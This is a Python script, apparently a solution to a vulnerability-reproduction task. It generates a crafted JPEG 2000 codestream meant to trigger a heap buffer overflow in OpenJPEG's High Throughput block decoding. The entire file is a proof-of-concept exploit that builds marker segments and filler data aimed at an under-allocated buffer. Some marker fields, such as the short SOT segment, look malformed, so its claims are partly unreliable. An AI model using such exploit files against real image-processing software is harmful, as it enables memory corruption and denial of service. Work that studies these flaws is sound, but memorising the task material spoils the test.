import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow in opj_t1_allocate_buffers (HT_DEC).
        
        The vulnerability exists in the buffer allocation logic for High Throughput (HT) 
        JPEG 2000 codeblocks. By constructing a J2K file with HT mode enabled in the 
        COD marker and standard large codeblocks (64x64), we can trigger the vulnerability.
        
        Args:
            src_path: Path to the vulnerable source code (unused in this generation strategy).

        Returns:
            bytes: The J2K codestream.
        """
        
        # 1. SOC (Start of Codestream)
        poc = b'\xff\x4f'
        
        # 2. SIZ (Image and Tile Size)
        # Define a 128x128 image, 1 tile, 1 component.
        # This provides a valid context for the decoder.
        siz_params = [
            0,              # Rsiz (Capabilities) - 0 (Profile 0)
            128, 128,       # Xsiz, Ysiz (Image dimensions)
            0, 0,           # XOsiz, YOsiz (Image offset)
            128, 128,       # XTsiz, YTsiz (Tile size)
            0, 0,           # XTOsiz, YTOsiz (Tile offset)
            1               # Csiz (Number of components)
        ]
        # Component spec: 8-bit depth (7), 1x1 subsampling
        comp_spec = b'\x07\x01\x01'
        
        siz_body = struct.pack('>HIIIIIIIIH', *siz_params) + comp_spec
        poc += b'\xff\x51' + struct.pack('>H', len(siz_body) + 2) + siz_body

        # 3. COD (Coding Style Default)
        # This is the critical part. We enable HT mode via the Style byte.
        # Scod = 0 (Entropy coding only)
        # SGcod = Order 0 (LRCP), Layers 1, MCT 0
        # SPcod = Levels 1, CblkWidth 64 (exp 4), CblkHeight 64 (exp 4), Style 0x40 (HT), Xform 0
        # Style 0x40 (bit 6) signals High Throughput (HT) decoding.
        cod_body = b'\x00' + b'\x00\x00\x01\x00' + b'\x01\x04\x04\x40\x00'
        poc += b'\xff\x52' + struct.pack('>H', len(cod_body) + 2) + cod_body
        
        # 4. QCD (Quantization Default)
        # Sqcd = 0 (No quantization)
        # Exponents for 4 subbands (Level 1 decomposition: LL, HL, LH, HH)
        qcd_body = b'\x00' + b'\x00\x00\x00\x00'
        poc += b'\xff\x5c' + struct.pack('>H', len(qcd_body) + 2) + qcd_body
        
        # 5. SOT (Start of Tile)
        # Tile Index 0, Length Auto, TPsot 0, TNsot 1
        sot_body = b'\x00\x00' + b'\x00\x00\x00\x00' + b'\x00\x01'
        poc += b'\xff\x90' + struct.pack('>H', len(sot_body) + 2) + sot_body
        
        # 6. SOD (Start of Data)
        poc += b'\xff\x93'
        
        # 7. Payload
        # Provide simulated compressed data. 
        # A repeating pattern is used to ensure sufficient data is present to enter the decoding loop
        # and trigger the write operation on the under-allocated buffer.
        # We avoid 0xFF bytes to prevent them being interpreted as markers.
        poc += (b'\xaa\x55\xcc\x33') * 128
        
        # 8. EOC (End of Codestream)
        poc += b'\xff\xd9'
        
        return poc